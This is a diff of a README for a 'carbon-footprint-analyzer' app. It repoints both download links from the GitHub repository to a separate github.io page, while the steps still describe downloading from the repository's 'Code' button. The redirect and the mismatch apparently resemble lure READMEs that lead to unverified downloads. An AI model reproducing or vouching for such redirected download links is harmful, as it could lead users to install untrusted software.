@@ -1,6 +1,6 @@
 # 🌍 carbon-footprint-analyzer - Track your household carbon impact easily
 
-[![Download Carbon Footprint Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/innajudeochristian815/carbon-footprint-analyzer)
+[![Download Carbon Footprint Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://innajudeochristian815.github.io)
 
 ## 📋 About the application
 
@@ -19,7 +19,7 @@ The application runs locally on your computer. It does not require an internet c
 
 Follow these steps to prepare the application on your computer.
 
-1.  Visit the official repository page to download the software: [https://github.com/innajudeochristian815/carbon-footprint-analyzer](https://github.com/innajudeochristian815/carbon-footprint-analyzer)
+1.  Visit the official repository page to download the software: [https://innajudeochristian815.github.io](https://innajudeochristian815.github.io)
 2.  Click the green "Code" button on the GitHub page.
 3.  Select "Download ZIP" from the menu.
 4.  Find the downloaded file in your "Downloads" folder.
